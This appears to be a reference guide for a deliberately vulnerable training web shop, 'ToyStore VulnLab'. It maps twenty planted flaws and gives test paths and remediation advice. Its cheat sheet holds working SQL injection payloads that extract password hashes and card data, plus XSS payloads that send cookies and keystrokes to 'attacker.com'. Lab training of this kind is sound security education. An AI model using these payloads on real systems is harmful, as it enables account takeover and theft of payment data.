# ğŸ¯ ToyStore VulnLab - Vulnerability Matrix

## Quick Reference Guide

This document provides a comprehensive matrix of all vulnerabilities in the ToyStore application for quick reference during penetration testing.

---

## ğŸ“Š Vulnerability Summary

| ID | Vulnerability | Type | OWASP | Severity | Location | Status |
|----|---------------|------|-------|----------|----------|--------|
| V001 | IDOR - User Profiles | Access Control | A01 | HIGH | /profile/:id | Hidden |
| V002 | IDOR - Orders | Access Control | A01 | HIGH | /order/:id | Hidden |
| V003 | Admin Bypass via Query Param | Access Control | A01 | CRITICAL | /admin?role=admin | Hidden |
| V004 | MD5 Password Hashing | Cryptography | A02 | CRITICAL | User Auth | Hidden |
| V005 | Plain Text Credit Cards | Cryptography | A02 | CRITICAL | Database | Hidden |
| V006 | Weak Session Secret | Cryptography | A02 | HIGH | App Config | Hidden |
| V007 | SQL Injection in Search | Injection | A03 | CRITICAL | /search?q= | Hidden |
| V008 | Stored XSS in Reviews | Injection | A03 | HIGH | Product Reviews | Hidden |
| V009 | Client-Side Price Manipulation | Insecure Design | A04 | CRITICAL | /checkout | Hidden |
| V010 | Unrestricted File Upload | Insecure Design | A04 | HIGH | /upload | Hidden |
| V011 | Debug Information Disclosure | Misconfiguration | A05 | CRITICAL | /debug | Hidden |
| V012 | Missing Security Headers | Misconfiguration | A05 | MEDIUM | All Pages | Hidden |
| V013 | Insecure Session Config | Misconfiguration | A05 | HIGH | App Config | Hidden |
| V014 | No Rate Limiting | Auth Failure | A07 | HIGH | /login | Hidden |
| V015 | Weak Password Policy | Auth Failure | A07 | HIGH | Registration | Hidden |
| V016 | No Account Lockout | Auth Failure | A07 | HIGH | Login | Hidden |
| V017 | Incomplete Audit Logging | Logging Failure | A09 | MEDIUM | System Wide | Hidden |
| V018 | No IP Address Logging | Logging Failure | A09 | LOW | Audit Logs | Hidden |
| V019 | Trust Client Data | Integrity Failure | A08 | HIGH | Payment | Hidden |
| V020 | No Input Validation | Integrity Failure | A08 | MEDIUM | Forms | Hidden |

---

## ğŸ—ºï¸ Attack Surface Map

### Authentication System
```
/register
â”œâ”€â”€ [V004] MD5 Password Hashing
â”œâ”€â”€ [V015] Weak Password Policy (6 chars only)
â””â”€â”€ [V020] No Input Validation

/login
â”œâ”€â”€ [V014] No Rate Limiting
â”œâ”€â”€ [V016] No Account Lockout
â””â”€â”€ [V017] Failed Attempts Not Logged

Session Management
â”œâ”€â”€ [V006] Weak Secret Key
â”œâ”€â”€ [V013] Insecure Cookie Flags
â””â”€â”€ [V012] Missing Security Headers
```

### Authorization System
```
/profile/:id
â””â”€â”€ [V001] IDOR - View Any User Profile

/order/:id
â””â”€â”€ [V002] IDOR - View Any Order

/admin
â””â”€â”€ [V003] Bypass with ?role=admin
```

### Data Input/Output
```
/search?q=
â””â”€â”€ [V007] SQL Injection

/product/:id/review
â””â”€â”€ [V008] Stored XSS

/upload
â””â”€â”€ [V010] Unrestricted File Upload
```

### Business Logic
```
/checkout â†’ /process-payment
â”œâ”€â”€ [V009] Client-Side Price
â””â”€â”€ [V019] Trust Client Amount

/payments (Database)
â””â”€â”€ [V005] Plain Text Credit Cards
```

### Information Disclosure
```
/debug
â””â”€â”€ [V011] Exposes DB Credentials

All Pages
â”œâ”€â”€ [V012] No Security Headers
â””â”€â”€ [V017] Incomplete Logging
```

---

## ğŸ¯ Test Paths by Skill Level

### ğŸŸ¢ Beginner Path (Start Here)

1. **IDOR Testing (15 mins)**
   - Test V001: Try /profile/1, /profile/2, /profile/3
   - Test V002: Try /order/1, /order/2, /order/3

2. **Access Control Bypass (10 mins)**
   - Test V003: Login as user, try /admin?role=admin

3. **Information Disclosure (5 mins)**
   - Test V011: Visit /debug page

**Learning Goals:**
- Understand broken access control
- Learn about IDOR vulnerabilities
- See impact of exposed credentials

---

### ğŸŸ¡ Intermediate Path

4. **SQL Injection (30 mins)**
   - Test V007: Start with `' OR '1'='1`
   - Extract users: UNION SELECT
   - Extract payments: Credit cards!

5. **XSS Attacks (20 mins)**
   - Test V008: `<script>alert('XSS')</script>` in reviews
   - Try cookie theft payloads
   - Test persistent XSS

6. **Business Logic Flaws (15 mins)**
   - Test V009: Manipulate price in DevTools
   - Test V019: Send fake payment amounts

**Learning Goals:**
- Master injection techniques
- Understand XSS impact
- Exploit business logic

---

### ğŸ”´ Advanced Path

7. **Cryptography Attacks (45 mins)**
   - Test V004: Extract MD5 hashes
   - Crack passwords with hashcat
   - Test V005: View plain text cards in DB

8. **Session Attacks (30 mins)**
   - Test V006: Analyze weak secret
   - Test V013: Check cookie flags
   - Attempt session fixation

9. **Comprehensive Exploitation (60 mins)**
   - Chain multiple vulnerabilities
   - SQL Injection â†’ Extract hash â†’ Crack â†’ Admin access
   - XSS â†’ Cookie theft â†’ Session hijacking

**Learning Goals:**
- Understand attack chains
- Practice advanced exploitation
- Learn defensive strategies

---

## ğŸ’‰ Exploitation Cheat Sheet

### SQL Injection Quick Commands

```sql
-- Basic test
' OR '1'='1

-- Extract users
' UNION SELECT id,username,email,password_md5,role,created_at FROM users--

-- Extract credit cards
' UNION SELECT id,card_number,card_holder,cvv,amount,created_at FROM payments--

-- Database enumeration
' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--

-- Count users
' UNION SELECT COUNT(*),NULL,NULL,NULL,NULL,NULL FROM users--
```

### XSS Payloads

```html
<!-- Alert box -->
<script>alert('XSS')</script>

<!-- Cookie theft -->
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://attacker.com/?k='+e.key)}</script>

<!-- DOM manipulation -->
<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>

<!-- Redirect -->
<script>window.location='http://attacker.com'</script>

<!-- Session hijack -->
<img src=x onerror="new Image().src='http://attacker.com/?sid='+document.cookie">
```

### IDOR Testing

```bash
# User profiles
for i in {1..10}; do curl -b cookies.txt http://localhost:3000/profile/$i; done

# Orders
for i in {1..20}; do curl -b cookies.txt http://localhost:3000/order/$i; done
```

### Price Manipulation

```javascript
// In browser console on /checkout page
document.querySelector('input[name="amount"]').value = '0.01';
// Then submit form
```

---

## ğŸ” Database Queries for Testing

```sql
-- Connect to database
docker exec -it toystore_db psql -U vulnuser -d vulnlab

-- View all users with password hashes
SELECT id, username, email, password_md5, role FROM users;

-- View all credit cards (PLAIN TEXT!)
SELECT order_id, card_number, card_holder, cvv, amount FROM payments;

-- View orders and totals
SELECT o.id, u.username, o.total, o.status 
FROM orders o 
JOIN users u ON o.user_id = u.id;

-- Check audit logs (incomplete)
SELECT * FROM audit_logs ORDER BY created_at DESC;

-- View cart contents
SELECT c.user_id, u.username, p.name, c.quantity 
FROM cart_items c 
JOIN users u ON c.user_id = u.id 
JOIN products p ON c.product_id = p.id;

-- View reviews (may contain XSS)
SELECT r.id, u.username, p.name, r.rating, r.title, r.comment 
FROM reviews r 
JOIN users u ON r.user_id = u.id 
JOIN products p ON r.product_id = p.id;
```

---

## ğŸ›¡ï¸ Security Headers Analysis

### Current Headers (Vulnerable)
```bash
curl -I http://localhost:3000

# Missing:
# - Content-Security-Policy
# - X-Frame-Options
# - X-Content-Type-Options
# - Strict-Transport-Security
# - Referrer-Policy
```

### Recommended Headers
```javascript
// Should be implemented:
res.setHeader('Content-Security-Policy', "default-src 'self'");
res.setHeader('X-Frame-Options', 'DENY');
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('Strict-Transport-Security', 'max-age=31536000');
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
```

---

## ğŸ“ˆ Impact Assessment

### Critical (Fix Immediately)
- **V003** Admin Bypass: Full system compromise
- **V004** MD5 Passwords: All accounts can be cracked
- **V005** Plain Text Cards: PCI DSS violation, legal liability
- **V007** SQL Injection: Complete database access
- **V009** Price Manipulation: Financial loss
- **V011** Debug Disclosure: System credentials exposed

### High (Fix Soon)
- **V001/V002** IDOR: Privacy violations
- **V006** Weak Secret: Session forgery possible
- **V008** Stored XSS: User account compromise
- **V010** File Upload: Potential RCE
- **V014** No Rate Limit: Brute force attacks

### Medium (Should Fix)
- **V012** Missing Headers: Various attacks easier
- **V017** Incomplete Logging: Cannot detect attacks

### Low (Nice to Have)
- **V018** No IP Logging: Harder to trace attackers

---

## ğŸ“ Testing Objectives Checklist

### Knowledge Goals
- [ ] Understand OWASP Top 10
- [ ] Learn SQL injection techniques
- [ ] Master XSS payloads
- [ ] Practice IDOR exploitation
- [ ] Analyze cryptographic failures

### Practical Skills
- [ ] Use Burp Suite effectively
- [ ] Write comprehensive PoCs
- [ ] Chain multiple vulnerabilities
- [ ] Extract data from databases
- [ ] Develop remediation strategies

### Professional Development
- [ ] Write detailed security reports
- [ ] Communicate findings clearly
- [ ] Prioritize vulnerabilities
- [ ] Recommend fixes
- [ ] Understand business impact

---

## ğŸ“ Testing Report Template

```markdown
# Vulnerability Report

## Finding: [Name]
**ID:** V00X
**OWASP:** A0X
**Severity:** Critical/High/Medium/Low
**CVSS:** X.X

### Description
[What is the vulnerability]

### Location
- URL: http://localhost:3000/path
- Parameter: [param]
- Method: GET/POST

### Impact
[What can attacker do]

### Proof of Concept
```
[Steps to reproduce]
```

### Remediation
```javascript
[Code fix]
```

### References
- [OWASP link]
- [CWE link]
```

---

## ğŸš€ Quick Start Testing

```bash
# 1. Start application
bash start.sh

# 2. Login
curl -c cookies.txt -d "username=user&password=user12" http://localhost:3000/login

# 3. Test IDOR
curl -b cookies.txt http://localhost:3000/profile/2

# 4. Test SQL injection
curl "http://localhost:3000/search?q=' OR '1'='1"

# 5. Test admin bypass
curl -b cookies.txt "http://localhost:3000/admin?role=admin"

# 6. Access debug page
curl http://localhost:3000/debug

# 7. View database
docker exec -it toystore_db psql -U vulnuser -d vulnlab -c "SELECT * FROM users;"
```

---

## ğŸ¯ Success Criteria

By the end of testing, you should be able to:

âœ… Exploit all 20 vulnerabilities  
âœ… Extract complete user database  
âœ… Access admin functionality  
âœ… Retrieve credit card data  
âœ… Crack user passwords  
âœ… Inject malicious JavaScript  
âœ… Manipulate payment amounts  
âœ… Bypass all access controls  
âœ… Understand each vulnerability's impact  
âœ… Propose proper remediation  

---

## ğŸ“š Additional Resources

- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Academy:** https://portswigger.net/web-security
- **HackTricks:** https://book.hacktricks.xyz/
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings

---

**Remember:** This is a legal, controlled environment for learning. Never use these techniques on systems you don't own or have permission to test!

Happy Ethical Hacking! ğŸ”’ğŸ¯
